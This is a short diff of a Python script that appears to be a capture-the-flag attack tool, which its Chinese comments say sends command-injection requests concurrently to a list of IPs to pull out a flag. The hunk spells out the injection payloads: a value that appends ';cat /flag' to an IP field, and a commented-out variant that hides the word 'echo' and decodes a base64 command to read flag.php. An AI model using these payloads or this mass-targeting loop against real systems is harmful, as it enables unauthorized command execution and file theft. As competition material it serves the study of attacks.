@@ -33,7 +33,7 @@ def get_flag(ip_list):
     """并发向每个IP发送命令注入请求，提取flag"""
     flag_dict = {}
     data = {"ip": "127.0.0.1;cat /flag"}  # 根据实际调整payload
-    data = {"ip": "127.0.0.1;ec\ho \"Y2F0IGZsYWcucGhw\"|base64 -d"}  # 根据实际调整payload
+    #data = {"ip": "127.0.0.1;ec\ho \"Y2F0IGZsYWcucGhw\"|base64 -d"}  # 根据实际调整payload
     def attack(ip):
         url = f"http://{ip}"  # 若已知端口可拼接，否则可尝试常见端口
         try:
